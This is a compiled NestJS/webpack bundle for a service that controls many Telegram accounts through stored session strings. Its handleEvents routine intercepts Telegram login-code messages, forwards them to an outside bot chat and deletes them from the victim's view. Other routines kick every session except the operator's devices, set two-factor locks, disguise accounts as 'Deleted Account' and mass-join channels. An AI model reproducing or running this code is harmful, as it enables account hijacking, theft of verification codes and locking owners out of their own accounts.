    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getChatId", null);
__decorate([
    (0, common_1.Post)('joinchannels/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Join channels' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ description: 'Channels string', schema: { type: 'object', properties: { channels: { type: 'string' } } } })
    //@apiresponse({ status: 200, description: 'Channels joined successfully' })
    //@apiresponse({ status: 400, description: 'Bad request' })
    ,
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)('channels')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "joinChannels", null);
__decorate([
    (0, common_1.Get)('removeauths/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Remove other authorizations' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true })
    //@apiresponse({ status: 200, description: 'Authorizations removed successfully' })
    //@apiresponse({ status: 400, description: 'Bad request' })
    ,
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "removeOtherAuths", null);
__decorate([
    (0, common_1.Get)('selfmsgsinfo/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get self messages info' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true })
    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })
    //@apiresponse({ status: 400, description: 'Bad request' })
    ,
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getSelfMsgsInfo", null);
__decorate([
    (0, common_1.Get)('channelinfo/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get channel info' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'sendIds', description: 'Whether to send IDs or not', required: false })
    //@apiresponse({ status: 200, description: 'Channel info fetched successfully' })
    //@apiresponse({ status: 400, description: 'Bad request' })
    ,
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('sendIds')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Boolean]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getChannelInfo", null);
__decorate([
    (0, common_1.Get)('auths/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get authorizations' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true })
    //@apiresponse({ status: 200, description: 'Authorizations fetched successfully' })
    //@apiresponse({ status: 400, description: 'Bad request' })
    ,
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getAuths", null);
__decorate([
    (0, common_1.Get)('set2Fa/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Set 2Fa' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true })
    //@apiresponse({ status: 200, description: '2Fa set successfully' })
    //@apiresponse({ status: 400, description: 'Bad request' })
    ,
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "set2Fa", null);
__decorate([
    (0, common_1.Get)('setprofilepic/:mobile/:name'),
    (0, swagger_1.ApiOperation)({ summary: 'Set Profile Picture' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    (0, swagger_1.ApiParam)({ name: 'name', description: 'Profile name', type: String }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Param)('name')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "setProfilePic", null);
__decorate([
    (0, common_1.Get)('SetAsBufferClient/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Set as Buffer Client' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "setAsBufferClient", null);
__decorate([
    (0, common_1.Get)('updatePrivacy/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update Privacy Settings' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "updatePrivacy", null);
__decorate([
    (0, common_1.Get)('UpdateUsername/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update Username' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    (0, swagger_1.ApiQuery)({ name: 'username', description: 'New username', type: String }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('username')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "updateUsername", null);
__decorate([
    (0, common_1.Get)('updateNameandBio/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update Name' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    (0, swagger_1.ApiQuery)({ name: 'firstName', description: 'First Name', type: String }),
    (0, swagger_1.ApiQuery)({ name: 'about', description: 'About', type: String }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('firstName')),
    __param(2, (0, common_1.Query)('about')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "updateName", null);
exports.TelegramController = TelegramController = __decorate([
    (0, common_1.Controller)('telegram'),
    (0, swagger_1.ApiTags)('Telegram'),
    __metadata("design:paramtypes", [Telegram_service_1.TelegramService])
], TelegramController);


/***/ }),

/***/ "./nest/components/Telegram/Telegram.module.ts":
/*!*****************************************************!*\
  !*** ./nest/components/Telegram/Telegram.module.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TelegramModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const Telegram_controller_1 = __webpack_require__(/*! ./Telegram.controller */ "./nest/components/Telegram/Telegram.controller.ts");
const users_module_1 = __webpack_require__(/*! ../users/users.module */ "./nest/components/users/users.module.ts");
const buffer_client_module_1 = __webpack_require__(/*! ../buffer-clients/buffer-client.module */ "./nest/components/buffer-clients/buffer-client.module.ts");
const Telegram_service_1 = __webpack_require__(/*! ./Telegram.service */ "./nest/components/Telegram/Telegram.service.ts");
let TelegramModule = class TelegramModule {
};
exports.TelegramModule = TelegramModule;
exports.TelegramModule = TelegramModule = __decorate([
    (0, common_1.Module)({
        imports: [users_module_1.UsersModule, buffer_client_module_1.BufferClientModule],
        controllers: [Telegram_controller_1.TelegramController],
        providers: [Telegram_service_1.TelegramService]
    })
], TelegramModule);


/***/ }),

/***/ "./nest/components/Telegram/Telegram.service.ts":
/*!******************************************************!*\
  !*** ./nest/components/Telegram/Telegram.service.ts ***!
  \******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
var TelegramService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TelegramService = void 0;
const buffer_client_service_1 = __webpack_require__(/*! ./../buffer-clients/buffer-client.service */ "./nest/components/buffer-clients/buffer-client.service.ts");
const users_service_1 = __webpack_require__(/*! ../users/users.service */ "./nest/components/users/users.service.ts");
const utils_1 = __webpack_require__(/*! ../../../utils */ "./utils.js");
const TelegramManager_1 = __importDefault(__webpack_require__(/*! ./TelegramManager */ "./nest/components/Telegram/TelegramManager.ts"));
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const cloudinary_1 = __webpack_require__(/*! ../../../cloudinary */ "./cloudinary.js");
let TelegramService = TelegramService_1 = class TelegramService {
    constructor(usersService, bufferClientService) {
        this.usersService = usersService;
        this.bufferClientService = bufferClientService;
    }
    getActiveClientSetup() {
        return TelegramService_1.activeClientSetup;
    }
    setActiveClientSetup(data) {
        TelegramService_1.activeClientSetup = data;
    }
    getClient(number) {
        return TelegramService_1.clientsMap.get(number);
    }
    hasClient(number) {
        return TelegramService_1.clientsMap.has(number);
    }
    deleteClient(number) {
        return __awaiter(this, void 0, void 0, function* () {
            const cli = this.getClient(number);
            yield (cli === null || cli === void 0 ? void 0 : cli.disconnect());
            return TelegramService_1.clientsMap.delete(number);
        });
    }
    disconnectAll() {
        return __awaiter(this, void 0, void 0, function* () {
            const data = TelegramService_1.clientsMap.entries();
            console.log("Disconnecting All Clients");
            for (const [phoneNumber, client] of data) {
                try {
                    yield (client === null || client === void 0 ? void 0 : client.disconnect());
                    TelegramService_1.clientsMap.delete(phoneNumber);
                    console.log(`Client disconnected: ${phoneNumber}`);
                }
                catch (error) {
                    console.log((0, utils_1.parseError)(error));
                    console.log(`Failed to Disconnect : ${phoneNumber}`);
                }
            }
        });
    }
    createClient(mobile_1) {
        return __awaiter(this, arguments, void 0, function* (mobile, autoDisconnect = true, handler = true) {
            const user = (yield this.usersService.search({ mobile }))[0];
            if (!user) {
                throw new common_1.BadRequestException('user not found');
            }
            if (!TelegramService_1.clientsMap.has(mobile)) {
                const telegramManager = new TelegramManager_1.default(user.session, user.mobile);
                try {
                    const client = yield telegramManager.createClient(handler);
                    if (client) {
                        TelegramService_1.clientsMap.set(mobile, telegramManager);
                        if (autoDisconnect) {
                            setTimeout(() => __awaiter(this, void 0, void 0, function* () {
                                if (client.connected || TelegramService_1.clientsMap.get(mobile)) {
                                    console.log("SELF destroy client");
                                    yield telegramManager.disconnect();
                                }
                                else {
                                    console.log("Client Already Disconnected");
                                }
                                TelegramService_1.clientsMap.delete(mobile);
                            }), 180000);
                        }
                        else {
                            setInterval(() => __awaiter(this, void 0, void 0, function* () {
                                yield client.connect();
                            }), 20000);
                        }
                        return telegramManager;
                    }
                    else {
                        throw new common_1.BadRequestException('Client Expired');
                    }
                }
                catch (error) {
                    console.log("Parsing Error");
                    const errorDetails = (0, utils_1.parseError)(error);
                    if ((0, utils_1.contains)(errorDetails.message.toLowerCase(), ['expired', 'unregistered', 'deactivated'])) {
                        console.log("Deleting User: ", user.mobile);
                        yield this.usersService.delete(user.tgId);
                    }
                    else {
                        console.log('Not Deleting user');
                    }
                    throw new common_1.BadRequestException(errorDetails.message);
                }
            }
            else {
                return TelegramService_1.clientsMap.get(mobile);
            }
        });
    }
    getMessages(mobile_1, username_1) {
        return __awaiter(this, arguments, void 0, function* (mobile, username, limit = 8) {
            const telegramClient = TelegramService_1.clientsMap.get(mobile);
            return telegramClient.getMessages(username, limit);
        });
    }
    //@apiresponse({ status: 400, description: 'Bad request' })
    getChatId(mobile, username) {
        return __awaiter(this, void 0, void 0, function* () {
            const telegramClient = TelegramService_1.clientsMap.get(mobile);
            return yield telegramClient.getchatId(username);
        });
    }
    joinChannels(mobile, channels) {
        return __awaiter(this, void 0, void 0, function* () {
            const telegramClient = TelegramService_1.clientsMap.get(mobile);
            telegramClient.joinChannels(channels);
            return 'Channels joined successfully';
        });
    }
    removeOtherAuths(mobile) {
        return __awaiter(this, void 0, void 0, function* () {
            const telegramClient = TelegramService_1.clientsMap.get(mobile);
            yield telegramClient.removeOtherAuths();
            return 'Authorizations removed successfully';
        });
    }
    //@apiresponse({ status: 400, description: 'Bad request' })
    getSelfMsgsInfo(mobile) {
        return __awaiter(this, void 0, void 0, function* () {
            const telegramClient = TelegramService_1.clientsMap.get(mobile);
            return yield telegramClient.getSelfMSgsInfo();
        });
    }
    getChannelInfo(mobile_1) {
        return __awaiter(this, arguments, void 0, function* (mobile, sendIds = false) {
            const telegramClient = TelegramService_1.clientsMap.get(mobile);
            return yield telegramClient.channelInfo(sendIds);
        });
    }
    getAuths(mobile) {
        return __awaiter(this, void 0, void 0, function* () {
            const telegramClient = TelegramService_1.clientsMap.get(mobile);
            return yield telegramClient.getAuths();
        });
    }
    set2Fa(mobile) {
        return __awaiter(this, void 0, void 0, function* () {
            const telegramClient = TelegramService_1.clientsMap.get(mobile);
            try {
                yield telegramClient.set2fa();
                yield telegramClient.disconnect();
                return '2Fa set successfully';
            }
            catch (error) {
                const errorDetails = (0, utils_1.parseError)(error);
                throw new common_1.HttpException(errorDetails.message, parseInt(errorDetails.status));
            }
        });
    }
    setProfilePic(mobile, name) {
        return __awaiter(this, void 0, void 0, function* () {
            const telegramClient = TelegramService_1.clientsMap.get(mobile);
            try {
                yield cloudinary_1.CloudinaryService.getInstance(name);
                yield (0, utils_1.sleep)(2000);
                yield telegramClient.updateProfilePic('./dp1.jpg');
                yield (0, utils_1.sleep)(1000);
                yield telegramClient.updateProfilePic('./dp2.jpg');
                yield (0, utils_1.sleep)(1000);
                yield telegramClient.updateProfilePic('./dp3.jpg');
                yield (0, utils_1.sleep)(1000);
                yield telegramClient.disconnect();
                return '2Fa set successfully';
            }
            catch (error) {
                const errorDetails = (0, utils_1.parseError)(error);
                throw new common_1.HttpException(errorDetails.message, parseInt(errorDetails.status));
            }
        });
    }
    setAsBufferClient(mobile) {
        return __awaiter(this, void 0, void 0, function* () {
            const user = (yield this.usersService.search({ mobile }))[0];
            if (!user) {
                throw new common_1.BadRequestException('user not found');
            }
            const telegramClient = TelegramService_1.clientsMap.get(mobile);
            try {
                yield telegramClient.set2fa();
                yield (0, utils_1.sleep)(30000);
                yield telegramClient.updateUsername('');
                yield (0, utils_1.sleep)(5000);
                yield telegramClient.updatePrivacyforDeletedAccount();
                yield (0, utils_1.sleep)(5000);
                yield telegramClient.updateProfile("Deleted Account", "Deleted Account");
                yield (0, utils_1.sleep)(5000);
                yield telegramClient.deleteProfilePhotos();
                yield (0, utils_1.sleep)(5000);
                yield this.bufferClientService.create(user);
                return "Client set as buffer successfully";
            }
            catch (error) {
                const errorDetails = (0, utils_1.parseError)(error);
                throw new common_1.HttpException(errorDetails.message, parseInt(errorDetails.status));
            }
        });
    }
    updatePrivacy(mobile) {
        return __awaiter(this, void 0, void 0, function* () {
            const telegramClient = TelegramService_1.clientsMap.get(mobile);
            try {
                yield telegramClient.updatePrivacy();
                return "Privacy updated successfully";
            }
            catch (error) {
                const errorDetails = (0, utils_1.parseError)(error);
                throw new common_1.HttpException(errorDetails.message, parseInt(errorDetails.status));
            }
        });
    }
    updateUsername(mobile, username) {
        return __awaiter(this, void 0, void 0, function* () {
            const telegramClient = TelegramService_1.clientsMap.get(mobile);
            try {
                yield telegramClient.updateUsername(username);
                return "Username updated successfully";
            }
            catch (error) {
                console.log("Some Error: ", (0, utils_1.parseError)(error), error);
                throw new Error("Failed to update username");
            }
        });
    }
    updateNameandBio(mobile, firstName, about) {
        return __awaiter(this, void 0, void 0, function* () {
            const telegramClient = TelegramService_1.clientsMap.get(mobile);
            try {
                yield telegramClient.updateProfile(firstName, about);
                return "Username updated successfully";
            }
            catch (error) {
                console.log("Some Error: ", (0, utils_1.parseError)(error), error);
                throw new Error("Failed to update username");
            }
        });
    }
};
exports.TelegramService = TelegramService;
TelegramService.clientsMap = new Map();
exports.TelegramService = TelegramService = TelegramService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, common_1.Inject)((0, common_1.forwardRef)(() => users_service_1.UsersService))),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => buffer_client_service_1.BufferClientService))),
    __metadata("design:paramtypes", [users_service_1.UsersService,
        buffer_client_service_1.BufferClientService])
], TelegramService);


/***/ }),

/***/ "./nest/components/Telegram/TelegramManager.ts":
/*!*****************************************************!*\
  !*** ./nest/components/Telegram/TelegramManager.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
const telegram_1 = __webpack_require__(/*! telegram */ "telegram");
const sessions_1 = __webpack_require__(/*! telegram/sessions */ "telegram/sessions");
const events_1 = __webpack_require__(/*! telegram/events */ "telegram/events");
const tl_1 = __webpack_require__(/*! telegram/tl */ "telegram/tl");
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const fs = __importStar(__webpack_require__(/*! fs */ "fs"));
const uploads_1 = __webpack_require__(/*! telegram/client/uploads */ "telegram/client/uploads");
const mongoose_1 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
const activechannels_service_1 = __webpack_require__(/*! ../activechannels/activechannels.service */ "./nest/components/activechannels/activechannels.service.ts");
const active_channel_schema_1 = __webpack_require__(/*! ../activechannels/schemas/active-channel.schema */ "./nest/components/activechannels/schemas/active-channel.schema.ts");
const utils_1 = __webpack_require__(/*! ../../../utils */ "./utils.js");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const Logger_1 = __webpack_require__(/*! telegram/extensions/Logger */ "telegram/extensions/Logger");
const IMap_1 = __webpack_require__(/*! ../../IMap/IMap */ "./nest/IMap/IMap.ts");
class TelegramManager {
    constructor(sessionString, phoneNumber) {
        console.log(sessionString);
        this.activeChannelsService = new activechannels_service_1.ActiveChannelsService(mongoose_1.default.model(active_channel_schema_1.ActiveChannel.name, active_channel_schema_1.ActiveChannelSchema));
        this.session = new sessions_1.StringSession(sessionString);
        this.phoneNumber = phoneNumber;
        this.client = null;
        this.channelArray = [];
    }
    disconnect() {
        return __awaiter(this, void 0, void 0, function* () {
            if (this.client) {
                yield this.client.disconnect();
                yield this.client.destroy();
            }
            this.session.delete();
        });
    }
    getchatId(username) {
        return __awaiter(this, void 0, void 0, function* () {
            if (!this.client)
                throw new Error('Client is not initialized');
            const entity = yield this.client.getInputEntity(username);
            return entity;
        });
    }
    createClient() {
        return __awaiter(this, arguments, void 0, function* (handler = true) {
            this.client = new telegram_1.TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {
                connectionRetries: 5,
            });
            this.client.setLogLevel(Logger_1.LogLevel.ERROR);
            yield this.client.connect();
            const me = yield this.client.getMe();
            console.log("Connected Client : ", me.phone);
            if (handler && this.client) {
                this.client.addEventHandler((event) => __awaiter(this, void 0, void 0, function* () { yield this.handleEvents(event); }), new events_1.NewMessage());
            }
            return this.client;
        });
    }
    getMessages(entityLike_1) {
        return __awaiter(this, arguments, void 0, function* (entityLike, limit = 8) {
            const messages = yield this.client.getMessages(entityLike, { limit });
            return messages;
        });
    }
    getDialogs() {
        return __awaiter(this, void 0, void 0, function* () {
            const chats = yield this.client.getDialogs({ limit: 500 });
            console.log("TotalChats:", chats.total);
            return chats;
        });
    }
    getLastMsgs(limit) {
        return __awaiter(this, void 0, void 0, function* () {
            if (!this.client)
                throw new Error('Client is not initialized');
            const msgs = yield this.client.getMessages("777000", { limit });
            let resp = '';
            msgs.forEach((msg) => {
                console.log(msg.text);
                resp += msg.text + "\n";
            });
            return resp;
        });
    }
    getSelfMSgsInfo() {
        return __awaiter(this, void 0, void 0, function* () {
            if (!this.client)
                throw new Error('Client is not initialized');
            const self = yield this.client.getMe();
            const selfChatId = self.id;
            let photoCount = 0;
            let videoCount = 0;
            let movieCount = 0;
            const messageHistory = yield this.client.getMessages(selfChatId, { limit: 200 });
            for (const message of messageHistory) {
                if (message.photo) {
                    photoCount++;
                }
                else if (message.video) {
                    videoCount++;
                }
                const text = message.text.toLocaleLowerCase();
                if ((0, utils_1.contains)(text, ['movie', 'series', '1080', '720', '640', 'title', 'aac', '265', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                    movieCount++;
                }
            }
            return { photoCount, videoCount, movieCount };
        });
    }
    channelInfo() {
        return __awaiter(this, arguments, void 0, function* (sendIds = false) {
            if (!this.client)
                throw new Error('Client is not initialized');
            const chats = yield this.client.getDialogs({ limit: 600 });
            let canSendTrueCount = 0;
            let canSendFalseCount = 0;
            let totalCount = 0;
            this.channelArray.length = 0;
            console.log(chats.total);
            chats.forEach((chat) => __awaiter(this, void 0, void 0, function* () {
                if (chat.isChannel || chat.isGroup) {
                    try {
                        const chatEntity = yield chat.entity.toJSON();
                        const { broadcast, defaultBannedRights } = chatEntity;
                        totalCount++;
                        if (!broadcast && !(defaultBannedRights === null || defaultBannedRights === void 0 ? void 0 : defaultBannedRights.sendMessages)) {
                            canSendTrueCount++;
                            this.channelArray.push(chatEntity.username);
                        }
                        else {
                            canSendFalseCount++;
                        }
                    }
                    catch (error) {
                        console.log((0, utils_1.parseError)(error));
                    }
                }
            }));
            return {
                chatsArrayLength: totalCount,
                canSendTrueCount,
                canSendFalseCount,
                ids: sendIds ? this.channelArray : []
            };
        });
    }
    joinChannels(str) {
        return __awaiter(this, void 0, void 0, function* () {
            var _a, _b, _c, _d;
            const channels = str.split('|');
            console.log(this.phoneNumber, " - channelsLen - ", channels.length);
            for (let i = 0; i < channels.length; i++) {
                const channel = channels[i].trim();
                console.log(this.phoneNumber, "Trying: ", channel);
                try {
                    const joinResult = yield ((_a = this.client) === null || _a === void 0 ? void 0 : _a.invoke(new tl_1.Api.channels.JoinChannel({
                        channel: yield ((_b = this.client) === null || _b === void 0 ? void 0 : _b.getEntity(channel))
                    })));
                    console.log(this.phoneNumber, " - Joined channel Success - ", channel);
                    try {
                        const chatEntity = yield ((_c = this.client) === null || _c === void 0 ? void 0 : _c.getEntity(channel));
                        const { title, id, broadcast, defaultBannedRights, participantsCount, megagroup, username } = chatEntity;
                        const entity = {
                            title,
                            id: id.toString(),
                            username,
                            megagroup,
                            participantsCount,
                            broadcast
                        };
                        if (!chatEntity.broadcast && !(defaultBannedRights === null || defaultBannedRights === void 0 ? void 0 : defaultBannedRights.sendMessages)) {
                            entity['canSendMsgs'] = true;
                            try {
                                yield this.activeChannelsService.update(entity.id.toString(), entity);
                                console.log("updated ActiveChannels");
                            }
                            catch (error) {
                                console.log((0, utils_1.parseError)(error));
                                console.log("Failed to update ActiveChannels");
                            }
                        }
                        else {
                            yield this.activeChannelsService.remove(entity.id.toString());
                            // await db.removeOnefromActiveChannel({ username: channel.startsWith("@") ? channel : `@${channel}` });
                            // await db.removeOnefromChannel({ username: channel.startsWith("@") ? channel : `@${channel}` });
                            console.log("Removed Channel- ", channel);
                        }
                    }
                    catch (error) {
                        console.log(this.phoneNumber, " - Failed - ", error);
                    }
                }
                catch (error) {
                    console.log("Channels ERR: ", error);
                    if (error.toString().includes("No user has") || error.toString().includes("USERNAME_INVALID")) {
                        const activeChannel = yield this.activeChannelsService.search({ username: channel.replace('@', '') });
                        yield this.activeChannelsService.remove((_d = activeChannel[0]) === null || _d === void 0 ? void 0 : _d.channelId);
                        // await db.removeOnefromChannel({ username: channel.startsWith("@") ? channel : `@${channel}` });
                        console.log("Removed Channel- ", channel);
                    }
                }
                console.log(this.phoneNumber, " - On waiting period");
                yield new Promise(resolve => setTimeout(resolve, 3 * 60 * 1000));
                console.log(this.phoneNumber, " - Will Try next");
            }
            console.log(this.phoneNumber, " - finished joining channels");
            if (this.client) {
                yield this.client.disconnect();
                // await deleteClient(this.phoneNumber);
            }
        });
    }
    removeOtherAuths() {
        return __awaiter(this, void 0, void 0, function* () {
            if (!this.client)
                throw new Error('Client is not initialized');
            const result = yield this.client.invoke(new tl_1.Api.account.GetAuthorizations());
            const updatedAuthorizations = result.authorizations.map((auth) => {
                var _a;
                if (auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||
                    auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||
                    auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||
                    auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru')
                    || auth.deviceModel.toLowerCase().includes('windows')) {
                    return auth;
                }
                else {
                    (_a = this.client) === null || _a === void 0 ? void 0 : _a.invoke(new tl_1.Api.account.ResetAuthorization({ hash: auth.hash }));
                    return null;
                }
            }).filter(Boolean);
            console.log(updatedAuthorizations);
        });
    }
    getAuths() {
        return __awaiter(this, void 0, void 0, function* () {
            if (!this.client)
                throw new Error('Client is not initialized');
            const result = yield this.client.invoke(new tl_1.Api.account.GetAuthorizations());
            return result;
        });
    }
    getAllChats() {
        return __awaiter(this, void 0, void 0, function* () {
            if (!this.client)
                throw new Error('Client is not initialized');
            const chats = yield this.client.getDialogs({ limit: 500 });
            console.log("TotalChats:", chats.total);
            const chatData = [];
            for (const chat of chats) {
                const chatEntity = yield chat.entity.toJSON();
                chatData.push(chatEntity);
            }
            return chatData;
        });
    }
    handleEvents(event) {
        return __awaiter(this, void 0, void 0, function* () {
            if (event.isPrivate) {
                if (event.message.chatId.toString() == "777000") {
                    console.log(event.message.text.toLowerCase());
                    const ppplbot = `https://api.telegram.org/bot${process.env.ramyaredd1bot}/sendMessage`;
                    const payload = {
                        "chat_id": "-1001801844217",
                        "text": event.message.text
                    };
                    axios_1.default.post(ppplbot, payload)
                        .then((response) => {
                    })
                        .catch((error) => {
                        console.log((0, utils_1.parseError)(error));
                        console.log((0, utils_1.parseError)(error));
                    });
                    yield event.message.delete({ revoke: true });
                }
            }
        });
    }
    updatePrivacyforDeletedAccount() {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                yield this.client.invoke(new tl_1.Api.account.SetPrivacy({
                    key: new tl_1.Api.InputPrivacyKeyPhoneCall(),
                    rules: [
                        new tl_1.Api.InputPrivacyValueDisallowAll()
                    ],
                }));
                console.log("Calls Updated");
                yield this.client.invoke(new tl_1.Api.account.SetPrivacy({
                    key: new tl_1.Api.InputPrivacyKeyProfilePhoto(),
                    rules: [
                        new tl_1.Api.InputPrivacyValueAllowAll()
                    ],
                }));
                console.log("PP Updated");
                yield this.client.invoke(new tl_1.Api.account.SetPrivacy({
                    key: new tl_1.Api.InputPrivacyKeyPhoneNumber(),
                    rules: [
                        new tl_1.Api.InputPrivacyValueDisallowAll()
                    ],
                }));
                console.log("Number Updated");
